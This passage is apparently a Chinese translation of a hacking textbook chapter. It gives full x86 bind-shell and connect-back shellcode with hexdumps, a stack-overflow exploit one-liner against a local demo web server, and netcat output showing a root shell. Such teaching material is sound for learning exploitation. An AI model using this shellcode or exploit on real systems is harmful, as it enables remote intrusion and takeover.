这条单独的指令可以替换以下两条指令，它们占用四个字节：

```
	89 C3              mov ebx,eax
	31 C0              xor eax,eax
```

EAX 寄存器需要被清零以仅清除寄存器的最高三个字节，而 EBX 已经清除了这些最高字节。所以交换 EAX 和 EBX 之间的值可以一石二鸟，将大小减少到以下单字节指令：

```
	93                 xchg eax,ebx
```

由于`xchg`指令实际上比两个寄存器之间的`mov`指令要小，因此它可以用来缩小其他地方的 shellcode。自然，这仅在源操作数的寄存器不重要的情况下才有效。以下版本的绑定端口 shellcode 使用了交换指令来进一步减少其大小。

### bind_shell.s

```
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66).
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; Ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.

  xchg esi, eax     ; Save socket FD in esi for later.

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000005 in eax.
  push BYTE 0x2     ; ecx starts at 2.
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```

这编译成与上一章中使用的 92 字节 bind_shell shellcode 相同的 bind_shell shellcode。

```
reader@hacking:~/booksrc $ nasm bind_shell.s 
reader@hacking:~/booksrc $ hexdump -C bind_shell
00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|
00000010  96 6a 66 58 43 52 66 68  7a 69 66 53 89 e1 6a 10  |.jfXCRfhzifS..j.|
00000020  51 56 89 e1 cd 80 b0 66  43 43 53 56 89 e1 cd 80  |QV.....fCCSV....|
00000030  b0 66 43 52 52 56 89 e1  cd 80 93 6a 02 59 b0 3f  |.fCRRV.....j.Y.?|
00000040  cd 80 49 79 f9 b0 0b 52  68 2f 2f 73 68 68 2f 62  |..Iy...Rh//shh/b|
00000050  69 6e 89 e3 52 89 e2 53  89 e1 cd 80              |in..R..S....|
0000005c
reader@hacking:~/booksrc $ diff bind_shell portbinding_shellcode

```

# 连接回 Shellcode

端口绑定 shellcode 很容易被防火墙挫败。大多数防火墙会阻止入站连接，除非是已知服务的特定端口。这限制了用户的暴露，并将防止端口绑定 shellcode 接收连接。软件防火墙现在如此普遍，端口绑定 shellcode 在野外实际工作的机会很小。

然而，防火墙通常不会过滤出站连接，因为这会阻碍可用性。从防火墙内部，用户应该能够访问任何网页或建立任何其他出站连接。这意味着如果 shellcode 发起出站连接，大多数防火墙都会允许它。

连接回 shellcode 不是等待攻击者的连接，而是发起一个 TCP 连接回攻击者的 IP 地址。打开 TCP 连接只需要调用`socket()`和调用`connect()`。这与绑定端口 shellcode 非常相似，因为 socket 调用完全相同，`connect()`调用接受与`bind()`相同的类型参数。以下连接回 shellcode 是从绑定端口 shellcode 经过一些修改（以粗体显示）得到的。

## 连接回 Shellcode

### connectback_shell.s

```
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66).
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.

  xchg esi, eax     ; Save socket FD in esi for later.

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  `push DWORD 0x482aa8c0 ; Build sockaddr struct: IP address = 192.168.42.72`
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  `inc ebx           ; ebx = 3 = SYS_CONNECT = connect()`
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000003 in eax.
  push BYTE 0x2     ; ecx starts at 2.
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; Count down to 0.
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11.
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```

在上面的 shellcode 中，连接 IP 地址设置为 192.168.42.72，这应该是攻击机的 IP 地址。这个地址以`0x482aa8c0`的形式存储在`in_addr`结构中，这是 72、42、168 和 192 的十六进制表示。当每个数字以十六进制形式显示时，这一点很清楚：

```
reader@hacking:~/booksrc $ gdb -q
(gdb) p /x 192
$1 = 0xc0
(gdb) p /x 168
$2 = 0xa8
(gdb) p /x 42
$3 = 0x2a
(gdb) p /x 72
$4 = 0x48
(gdb) p /x 31337
$5 = 0x7a69
(gdb)
```

由于这些值以网络字节序存储，但*x*86 架构是小端序，所以存储的 DWORD 看起来是反转的。这意味着 192.168.42.72 的 DWORD 是`0x482aa8c0`。这也适用于用于目标端口的两个字节的 WORD。当使用 gdb 以十六进制形式打印端口号 31337 时，字节序显示为小端序。这意味着显示的字节必须反转，所以 31337 的 WORD 是`0x697a`。

netcat 程序也可以使用`-l`命令行选项来监听入站连接。在下面的输出中，它用于监听端口 31337 的连接回 shellcode。`ifconfig`命令确保 eth0 的 IP 地址是 192.168.42.72，这样 shellcode 就可以连接回它。

```
reader@hacking:~/booksrc $ sudo ifconfig eth0 192.168.42.72 up
reader@hacking:~/booksrc $ ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:01:6C:EB:1D:50
          inet addr:192.168.42.72  Bcast:192.168.42.255  Mask:255.255.255.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
          Interrupt:16

reader@hacking:~/booksrc $ nc -v -l -p 31337
listening on [any] 31337 ...
```

现在，让我们尝试使用 connectback shellcode 来利用 tinyweb 服务器程序。从之前与这个程序的工作中，我们知道请求缓冲区长度为 500 字节，位于栈内存的`0xbffff5c0`位置。我们还知道返回地址位于缓冲区末尾 40 字节内。

```
reader@hacking:~/booksrc $ nasm connectback_shell.s
reader@hacking:~/booksrc $ hexdump -C connectback_shell
00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|
00000010  96 6a 66 58 43 68 c0 a8  2a 48 66 68 7a 69 66 53  |.jfXCh..*HfhzifS|
00000020  89 e1 6a 10 51 56 89 e1  43 cd 80 87 f3 87 ce 49  |..j.QV..C......I|
00000030  b0 3f cd 80 49 79 f9 b0  0b 52 68 2f 2f 73 68 68  |.?..Iy...Rh//shh|
00000040  2f 62 69 6e 89 e3 52 89  e2 53 89 e1 cd 80        |/bin..R..S....|
0000004e
reader@hacking:~/booksrc $ wc -c connectback_shell
78 connectback_shell
reader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 78 ))
402
reader@hacking:~/booksrc $ gdb -q --batch -ex "p /x 0xbffff5c0 + 200"
$1 = 0xbffff688
reader@hacking:~/booksrc $
```

由于缓冲区起始到返回地址的偏移量为 540 字节，因此必须写入总共 544 字节来覆盖四个字节的返回地址。由于返回地址使用多个字节，返回地址覆盖还需要正确对齐。为了确保正确对齐，NOP sled 和 shellcode 字节的和必须能被四整除。此外，shellcode 本身必须保持在覆盖的第一 500 字节内。这些是响应缓冲区的界限，之后的内存对应于在改变程序控制流之前可能写入栈上的其他值。保持在这些界限内可以避免随机覆盖 shellcode 的风险，这不可避免地会导致崩溃。重复返回地址 16 次将生成 64 字节，可以将这些字节放在 544 字节 exploit 缓冲区的末尾，并确保 shellcode 安全地位于缓冲区界限内。exploit 缓冲区开头的剩余字节将是 NOP sled。上述计算表明，402 字节的 NOP sled 可以正确对齐 78 字节的 shellcode，并将其安全地放置在缓冲区界限内。重复所需的返回地址 12 次将完美地间隔 exploit 缓冲区的最后 4 字节，以覆盖栈上保存的返回地址。用`0xbffff688`覆盖返回地址应该将执行返回到 NOP sled 的中间，同时避免接近缓冲区开始的字节，这些字节可能会被破坏。上述计算出的值将在以下 exploit 中使用，但首先 connect-back shell 需要一些地方来连接回。以下输出中，netcat 用于监听端口 31337 的传入连接。

```
reader@hacking:~/booksrc $ nc -v -l -p 31337
listening on [any] 31337 ...
```

现在，在另一个终端中，可以使用计算出的 exploit 值远程利用 tinyweb 程序。

### 在另一个终端窗口中

```
reader@hacking:~/booksrc $ (perl -e 'print "\x90"x402';
> cat connectback_shell;
> perl -e 'print "\x88\xf6\xff\xbf"x20 . "\r\n"') | nc -v 127.0.0.1 80
localhost [127.0.0.1] 80 (www) open
```

在原始终端中，shellcode 已经连接回监听端口 31337 的 netcat 进程。这提供了远程 root shell 访问。

```
reader@hacking:~/booksrc $ nc -v -l -p 31337
listening on [any] 31337 ...
connect to [192.168.42.72] from hacking.local [192.168.42.72] 34391
whoami
root
```

这个示例的网络配置稍微有些令人困惑，因为攻击目标是 127.0.0.1，而 shellcode 连接回 192.168.42.72。这两个 IP 地址都路由到同一个地方，但 192.168.42.72 在 shellcode 中使用起来比 127.0.0.1 更方便。由于回环地址包含两个空字节，地址必须通过多个指令在栈上构建。一种方法是将两个空字节写入栈中，使用一个清零的寄存器。文件 loopback_shell.s 是 connectback_shell.s 的修改版本，它使用 127.0.0.1 的回环地址。以下输出显示了这些差异。

```
reader@hacking:~/booksrc $ diff connectback_shell.s loopback_shell.s
21c21,22
<   push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72
---
>   push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1
>   mov WORD [esp+1], dx  ; overwrite the BBBB with 0000 in the previous push
reader@hacking:~/booksrc $
```

在将值`0x01BBBB7f`推送到栈后，ESP 寄存器将指向这个 DWORD 的开始。通过在 ESP+1 处写入两个空字节（null bytes）的 WORD，中间的两个字节将被覆盖，从而形成正确的返回地址。

这条额外的指令使 shellcode 的大小增加了几个字节，这意味着 NOP sled 也需要调整以适应漏洞缓冲区。这些计算在下面的输出中显示，并导致一个 397 字节的 NOP sled。这个使用 loopback shellcode 的漏洞利用假设 tinyweb 程序正在运行，并且有一个 netcat 进程正在监听端口 31337 上的传入连接。

```
reader@hacking:~/booksrc $ nasm loopback_shell.s
reader@hacking:~/booksrc $ hexdump -C loopback_shell | grep --color=auto 00
00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|
00000010  96 6a 66 58 43 68 7f bb  bb 01 66 89 54 24 01 66  |.jfXCh....f.T$.f|
00000020  68 7a 69 66 53 89 e1 6a  10 51 56 89 e1 43 cd 80  |hzifS..j.QV..C..|
00000030  87 f3 87 ce 49 b0 3f cd  80 49 79 f9 b0 0b 52 68  |....I.?..Iy...Rh|
00000040  2f 2f 73 68 68 2f 62 69  6e 89 e3 52 89 e2 53 89  |//shh/bin..R..S.|
00000050  e1 cd 80                                          |...|
00000053
reader@hacking:~/booksrc $ wc -c loopback_shell
83 loopback_shell
reader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 83 ))
397
reader@hacking:~/booksrc $ (perl -e 'print "\x90"x397';cat loopback_shell;perl -e 'print
 "\x88\
xf6\xff\xbf"x16 . "\r\n"') | nc -v 127.0.0.1 80
localhost [127.0.0.1] 80 (www) open
```

与之前的漏洞利用一样，监听端口 31337 的 netcat 终端将接收 rootshell。

```
reader@hacking:~ $ nc -vlp 31337
listening on [any] 31337 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 42406
whoami
root
```

这几乎看起来太简单了，不是吗？
